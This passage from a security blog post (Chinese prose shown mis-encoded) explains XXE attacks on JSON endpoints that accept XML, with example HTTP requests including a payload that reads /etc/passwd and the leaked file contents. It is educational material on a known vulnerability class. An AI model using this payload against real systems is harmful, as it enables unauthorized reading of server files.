<p>å°†å¦‚ä¸Šçš„<code>Content-Type</code>æ”¹ä¸ºxmlæ ¼å¼çš„å†å‘é€<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">HTTP Request:</span><br><span class="line"></span><br><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 112</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;search&gt;name&lt;/search&gt;</span><br><span class="line">&lt;value&gt;netspitest&lt;/value&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">HTTP Response:</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 43</span><br><span class="line"></span><br><span class="line">&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125;</span><br></pre></td></tr></table></figure></p>
<p>å¦‚æœè¿”å›çš„æ•°æ®æ˜¯ä¸€æ ·çš„ï¼Œé‚£ä¹ˆå°±è¯´æ˜æœåŠ¡å™¨å¯ä»¥æ¥å—xmlæ ¼å¼çš„æ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨xxeæ¥æ”»å‡»<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">HTTP Request:</span><br><span class="line"></span><br><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 288</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;search&gt;name&lt;/search&gt;</span><br><span class="line">&lt;value&gt;&amp;xxe;&lt;/value&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">HTTP Response:</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 2467</span><br><span class="line"></span><br><span class="line">&#123;&quot;error&quot;: &quot;no results for name root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync....</span><br></pre></td></tr></table></figure></p>
<p>ä½†æ˜¯å¹¶ä¸æ˜¯æ‰€æœ‰çš„jsonèŠ‚ç‚¹éƒ½æ˜¯æ¥å—xmlæ ¼å¼çš„æ•°æ®çš„ã€‚æœ‰å¯èƒ½è¿”å›è§£æé”™è¯¯çš„æç¤ºæˆ–è€…415ä¸æ”¯æŒåª’ä½“ç±»å‹çš„é”™è¯¯æ¶ˆæ¯</p>
<h5 id="å¸¦ä¸Šä¸€ä¸ªxxe-cheat-sheetï¼ŒDTD-Attacks"><a href="#å¸¦ä¸Šä¸€ä¸ªxxe-cheat-sheetï¼ŒDTD-Attacks" class="headerlink" title="å¸¦ä¸Šä¸€ä¸ªxxe-cheat-sheetï¼ŒDTD-Attacks"></a>å¸¦ä¸Šä¸€ä¸ª<a href="http://web-in-security.blogspot.hk/2016/03/xxe-cheat-sheet.html" target="_blank" rel="noopener">xxe-cheat-sheet</a>ï¼Œ<a href="https://github.com/RUB-NDS/DTD-Attacks" target="_blank" rel="noopener">DTD-Attacks</a></h5><h2 id="å‚è€ƒsecurity-tencent-comï¼Œ91ri-org"><a href="#å‚è€ƒsecurity-tencent-comï¼Œ91ri-org" class="headerlink" title="å‚è€ƒsecurity.tencent.comï¼Œ91ri.org"></a>å‚è€ƒ<a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">security.tencent.com</a>ï¼Œ<a href="https://www.91ri.org/12814.html" target="_blank" rel="noopener">91ri.org</a></h2>
  	</div>
	  
	  <div class="article-tags tags">
      
        <a href="/tags/vul/">vul</a>
      
	  </div>
    

	
		<div class="art-item-footer">
				
					<span class="art-item-left"><i class="icon icon-chevron-thin-left"></i>prevï¼š<a href="/2016/07/04/old-file-upload/" rel="prev"  title="ã€VULNERABLITYã€‘æ–‡ä»¶ä¸Šä¼ å­¦ä¹ æ€»ç»“">
						ã€VULNERABLITYã€‘æ–‡ä»¶ä¸Šä¼ å­¦ä¹ æ€»ç»“
					</a></span>
				
				
					<span class="art-item-right">nextï¼š<a href="/2016/03/20/old-CTF-BCTF-Crypto-SpecialRSA-writeup/" rel="next"  title="ã€CTFã€‘BCTF Crypto SpecialRSA writeup">
						ã€CTFã€‘BCTF Crypto SpecialRSA writeup
					</a><i class="icon icon-chevron-thin-right"></i></span>
				
		</div>
	
	</section>
	
		<section id="comments">
			<div id="disqus_thread"></div>
		</section>
	
</article>
<script>
	window.subData = {
		title: 'ã€VULNERABLITYã€‘XML External Entity(XXE)',
		tools: true
	}
</script>

      </div>
      <aside class='l_side'>
        
  <section class='m_widget about'>

<div class='header'>wh1t3p1g</div>
<div class='content'>
<div class='desc'>A Web ğŸ¶ &amp;&amp; Code Reviewer</div>
</div>
</section>

  <section class='m_widget links'>
<div class='header'>Links</div>
<div class='content'>
    <ul class="entry">
    
        <li><a class="flat-box" target="_blank" href="http://blog.orleven.com">
            <div class='name'>orleven</div>
        </a></li>
    
        <li><a class="flat-box" target="_blank" href="http://www.warmeng.com">
            <div class='name'>warmeng</div>
        </a></li>
    
        <li><a class="flat-box" target="_blank" href="http://fr4nk.0kami.cn">
            <div class='name'>fr4nk</div>
        </a></li>
    
    </ul>
</div>
</section>

  <section class='m_widget categories'>
<div class='header'>Categories</div>
<div class='content'>
    
    <ul class="entry">
    
        <li><a class="flat-box" href="/categories/codereview/"><div class='name'>codereview</div><div class='badget'>10</div></a></li>
    
        <li><a class="flat-box" href="/categories/ctf/"><div class='name'>ctf</div><div class='badget'>5</div></a></li>
    
        <li><a class="flat-box" href="/categories/notes/"><div class='name'>notes</div><div class='badget'>21</div></a></li>
    
    </ul>
    
</div>
</section>

  
<div class="m_widget tagcloud">
    <div class="header">Tags</div>
    <div class='content'>
        <a href="/tags/bctf/" style="font-size: 14px; color: #808080">bctf</a> <a href="/tags/cms/" style="font-size: 18px; color: #2b2b2b">cms</a> <a href="/tags/cve/" style="font-size: 16px; color: #555">cve</a> <a href="/tags/ddctf/" style="font-size: 14px; color: #808080">ddctf</a> <a href="/tags/hitbxctf/" style="font-size: 14px; color: #808080">hitbxctf</a> <a href="/tags/mobile/" style="font-size: 14px; color: #808080">mobile</a> <a href="/tags/njctf/" style="font-size: 14px; color: #808080">njctf</a> <a href="/tags/others/" style="font-size: 16px; color: #555">others</a> <a href="/tags/suctf/" style="font-size: 14px; color: #808080">suctf</a> <a href="/tags/vul/" style="font-size: 20px; color: #000">vul</a>
    </div>
</div>



      </aside>
      <script>setLoadingBarProgress(60);</script>
    </div>
  </div>
  <footer id="footer" class="clearfix">

	<div class="social-wrapper">
  	
      
        <a href="https://github.com/wh1t3p1g" class="social github"
          target="_blank" rel="external">
          <span class="icon icon-github"></span>
        </a>
      
        <a href="/atom.xml" class="social rss"
          target="_blank" rel="external">
          <span class="icon icon-rss"></span>
        </a>
      
    
  </div>
  
  <div>Theme <a href='https://github.com/stkevintan/hexo-theme-material-flow' class="codename">MaterialFlow</a> designed by <a href="http://keyin.me/" target="_blank">Kevin Tan</a>.</div>
  
</footer>


  <script>setLoadingBarProgress(80);</script>
  
<script>
  var disqus_shortname = '0kami';
  
  var disqus_url = 'http://blog.0kami.cn/2016/06/28/old-xxe/';
  
  (function(){
    var dsq = document.createElement('script');
    dsq.type = 'text/javascript';
    dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>


<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
<script src='//cdn.bootcss.com/node-waves/0.7.5/waves.min.js'></script>
<script src="//cdn.bootcss.com/scrollReveal.js/3.3.2/scrollreveal.min.js"></script>
<script src="/js/jquery.fitvids.js"></script>
<script>
	var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
	var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
	var ALGOLIA_API_KEY = "";
	var ALGOLIA_APP_ID = "";
	var ALGOLIA_INDEX_NAME = "";
  var AZURE_SERVICE_NAME = "";
  var AZURE_INDEX_NAME = "";
  var AZURE_QUERY_KEY = "";
  var BAIDU_API_ID = "";
  var SEARCH_SERVICE = "hexo";
  var ROOT = "/"||"/";
  if(!ROOT.endsWith('/'))ROOT += '/';
</script>
<script src="/js/search.js"></script>
<script src="/js/app.js"></script>


  <script>setLoadingBarProgress(100);</script>
</body>
</html>
